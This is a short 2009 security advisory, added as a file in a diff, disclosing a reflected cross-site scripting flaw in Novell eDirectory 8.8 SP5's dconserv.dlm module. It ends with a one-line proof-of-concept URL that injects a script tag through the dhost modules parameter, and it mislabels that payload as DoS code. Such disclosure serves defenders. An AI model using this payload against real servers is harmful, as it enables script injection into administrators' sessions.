@@ -1,0 +1,56 @@
+########################################################################
+#############
+
+Application: Novell Edirectory 8.8 SP5
+
+Platforms: Windows 2003 Server
+
+Exploitation: XSS
+
+Date: 2009-09-23
+
+Author: Francis Provencher (Protek Research Lab's)
+
+########################################################################
+#############
+
+1) Introduction
+2) Technical details and bug
+3) The Code
+
+########################################################################
+#############
+
+===============
+1) Introduction
+===============
+
+Novell Directory Services is a hierarchical, object oriented database that represents all the assets in an organization in a logical tree. Assets can include people, positions, servers, workstations, applications, printers, services, groups, etc. The use of dynamic rights inheritance and equivalence allows both global and fine grained access controls to be implemented efficiently. Access rights between objects in the tree are determined at the time of the request and is determined by the rights assigned to the objects by virtue of their location in the tree, any security equivalences and individual assignment
+
+(Source Wikipedia)
+
+########################################################################
+#############
+
+============================
+2) Technical details 
+============================
+
+Name:	dconserv.dlm
+Ver.:	202.19.15.0
+
+########################################################################
+#############
+
+===========
+3) The Code
+===========
+
+Proof of concept DoS code;
+
+https://*.*.*.*:8030/dhost/modules?I:dconserv.dlm=%3CSCRIPT%3Ealert(%22P
+rotek%20Research%20Lab's%22);%3C/SCRIPT%3E
+
+########################################################################
+#############
+(PRL-2009-08)
